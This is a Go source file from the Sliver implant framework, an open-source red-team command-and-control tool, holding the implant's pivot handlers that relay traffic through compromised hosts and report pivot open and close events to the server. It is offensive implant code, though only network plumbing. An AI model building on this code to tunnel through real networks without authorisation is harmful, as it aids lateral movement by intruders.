package handlers

import (
	"net"
	"sync"

	// {{if .Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/sliver/pivots"
	"github.com/bishopfox/sliver/sliver/transports"
	"github.com/golang/protobuf/proto"
)

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

var (
	genericPivotHandlers = map[uint32]PivotHandler{
		pb.MsgPivotData: pivotDataHandler,
	}
)

// GetPivotHandlers - Returns a map of pivot handlers
func GetPivotHandlers() map[uint32]PivotHandler {
	return genericPivotHandlers
}

// SendPivotOpen - Sends a PivotOpen message back to the server
func SendPivotOpen(pivotID uint32, pivotType string, remoteAddr string, connection *transports.Connection) {
	pivotOpen := &pb.PivotOpen{
		PivotID:       pivotID,
		PivotType:     pivotType,
		RemoteAddress: remoteAddr,
	}
	data, err := proto.Marshal(pivotOpen)
	if err != nil {
		// {{if .Debug}}
		log.Println(err)
		// {{end}}
		return
	}
	connection.Send <- &pb.Envelope{
		Type: pb.MsgPivotOpen,
		Data: data,
	}

}

// SendPivotClose - Sends a PivotClose message back to the server
func SendPivotClose(pivotID uint32, err error, connection *transports.Connection) {
	pivotClose := &pb.PivotClose{
		PivotID: pivotID,
		Err:     err.Error(),
	}
	data, err := proto.Marshal(pivotClose)
	if err != nil {
		// {{if .Debug}}
		log.Println(err)
		// {{end}}
		return
	}
	connection.Send <- &pb.Envelope{
		Type: pb.MsgPivotClose,
		Data: data,
	}
}

func pivotDataHandler(envelope *pb.Envelope, connection *transports.Connection) {
	pivData := &pb.PivotData{}
	proto.Unmarshal(envelope.Data, pivData)

	origData := &pb.Envelope{}
	proto.Unmarshal(pivData.Data, origData)

	pivotConn := pivotsMap.Pivot(pivData.GetPivotID())
	if pivotConn != nil {
		pivots.PivotWriteEnvelope(pivotConn, origData)
	} else {
		// {{if .Debug}}
		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
		// {{end}}
	}
}

// pivotsMap - holds the pivots, provides atomic access
var pivotsMap = &PivotsMap{
	Pivots: &map[uint32]*net.Conn{},
	mutex:  &sync.RWMutex{},
}

// PivotsMap - struct that defines de pivots, provides atomic access
type PivotsMap struct {
	mutex  *sync.RWMutex
	Pivots *map[uint32]*net.Conn
}

// Pivot - Get Pivot by ID
func (p *PivotsMap) Pivot(pivotID uint32) *net.Conn {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	return (*p.Pivots)[pivotID]
}

// AddPivot - Add a pivot to the map (atomically)
func (p *PivotsMap) AddPivot(pivotID uint32, conn *net.Conn) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	(*p.Pivots)[pivotID] = conn
}

// RemovePivot - Add a pivot to the map (atomically)
func (p *PivotsMap) RemovePivot(pivotID uint32) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	delete((*p.Pivots), pivotID)
}
